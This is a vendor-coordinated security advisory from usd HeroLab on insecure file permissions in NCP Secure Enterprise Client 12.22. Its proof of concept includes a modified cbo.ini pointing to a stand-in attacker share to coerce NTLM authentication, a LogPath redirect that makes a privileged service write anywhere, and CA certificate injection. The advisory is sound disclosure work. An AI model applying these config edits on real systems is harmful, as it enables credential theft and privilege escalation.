=== Content from herolab.usd.de_1cec5471_20250114_222957.html ===

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2022-0004/ "Deutsch")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2022-0004/ "Deutsch")

# usd-2022-0004 | NCP Secure Enterprise Client - Insecure File Permissions

**Advisory ID:** usd-2022-0004
**Product:** NCP Secure Enterprise Client
**Affected Version:** 12.22
**Vulnerability Type:** Insecure File Permissions
**Security Risk:** Medium
**Vendor URL:** https//www.ncp-e.com/
**Vendor Status:** Fixed

### Description

The *NCP Secure Enterprise* client is a *VPN* and networking application that is utilized by many organisations to connect workstations
to the cooperate network. The client stores it's configuration files within the directory **C:\\ProgramData\\NCP\\SecureClient**, which grants
low privileged user accounts write access to most resources. Attackers can abuse this configuration in different ways as demonstrated
in the *Proof of Concept* section below:

### Proof of Concept

This section contains proof of concepts for some of the writable resources:

#### cacerts

Since the folder **C:\\ProgramData\\NCP\\SecureClient\\cacerts** is writable for low privileged user accounts, it is possible to add new *CA*
certificates that may allow connections to untrusted endpoints:

![](https://herolab.usd.de/wp-content/uploads/sites/9/2022/06/cacerts.png)

#### cbo.ini

The file **C:\\ProgramData\\NCP\\SecureClient\\config\\cbo.ini** is also writable for low privileged user accounts. This file
can be used to configure custom branding of the *NCP Secure Enterprise* client by specifying the path to the desired theme
files. By specifying the address of a network share instead, it is possible to coerce a remote authentication by each user
that logs in on the prepared workstation. Furthermore, since the *NCP Secure Enterprise* client starts on startup, an remote
authentication of the machine account can be coerced.

```
[GENERAL]
Enabled=1[DEUTSCH]
Picture=\\\\attacker\\share\\test.png
HtmlLocal=%BaseDataDir%\\CustomBrandingOption\\de\\bla.html[ENGLISH]
Picture=\\\\attacker\\share\\test.png
HtmlLocal=%BaseDataDir%\\CustomBrandingOption\\en\\bla.html
```
#### ncpmon.ini

The file **C:\\ProgramData\\NCP\\SecureClient\\config\\ncpmon.ini** contains several different configuration settings.
One of them is the **LogPath** setting within the *Gina* section. Since the file is writable by low privileged user
accounts, it is possible to set the **LogPath** to an arbitrary directory.

```
[GENERAL]
...SNIP...[GINA]
DisableGinaClient=0
LogLevel=9
LogPath=C:\\
```

The configuration is then used by a high privileged service to write into the corresponding location:

```
C:\\>dir
 Datenträger in Laufwerk C: ist Windows   Verzeichnis von C:\\   05.05.2021  10:09    <DIR>          Program Files
   05.05.2021  10:09    <DIR>          Program Files (x86)
   05.05.2021  10:09    <DIR>          Users
   05.05.2021  10:09    <DIR>          Windows
   30.11.2021  10:51         1.960.248 NcpGinaLog.txt
```

Apart form the above mentioned issues, other attacks may be possible. The file **extdial.conf** contains e.g.
the filenames of *dynamic linked library* (*DLL*) files which could may lead to privilege escalation vulnerabilities
on certain setups.

### Fix

The contents of the configuration folder should be reviewed and more restrictive permissions should be applied
to files that store sensitive configuration items. Low privileged user accounts should only be allowed to modify
configuration options that do not affect the security of the operating system.

### References

* https://www.ncp-e.com/
* https://github.com/usdAG/SharpLink

### Timeline

* 2022-02-02 First contact request via info-mv@ncp-e.com
* 2022-02-02 Advisory transfered to the vendor
* 2022-02-15 Vendor appreciates the submission of the advisories and begins to fix the identified vulnerabilities
* 2022-06-09 Responsible Disclosure Team requests an update
* 2022-06-21 Vendor annouces a new software release available in August
* 2022-08-31 NCP Secure Enterprise Client 13.10 is released
* 2023-03-03 This advisory is published

### Credits

These security vulnerabilities were found by Tobias Neitzel.

###

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

#### [Contact](https://www.usd.de/en/contact/)

[Imprint](https://www.usd.de/en/imprint/)

[Privacy Protection](https://www.usd.de/en/privacy-protection/)

[General Terms and Conditions](https://www.usd.de/en/terms-conditions/)

© 2025 usd AG

#### Follow Us

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)     [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/showcase/usd-ag-international/)

[Report a vulnerability or bug](https://www.usd.de/en/report-a-vulnerability-or-bug/)

[Code of Ethics](/en/code-of-ethics/)

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/en/the-security-risks-of-overlong-utf-8-encodings/)

Sep 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories on hugocms and Gitea](https://herolab.usd.de/en/security-advisories-on-hugocms-and-gitea/)

Jul 25, 2024

The pentest professionals at usd HeroLab examined hugocms and Gitea during their pentests. Thereby, several vulnerabilities were identified. The vulnerabilities were reported to the vendors as part of the Responsible Disclosure Policy. The usd HeroLab Advisories can...

## [Security Advisory on AXIS Webcam](https://herolab.usd.de/en/security-advisory-on-axis-webcam/)

Jul 1, 2024

The pentest professionals at usd HeroLab examined the AXIS Webcam (P1364) during their pentests. Our professionals discovered a vulnerability (cross-site request forgery) in the admin panel of AXIS P1364 Webcam. Exploiting this vulnerability enables an attacker to...


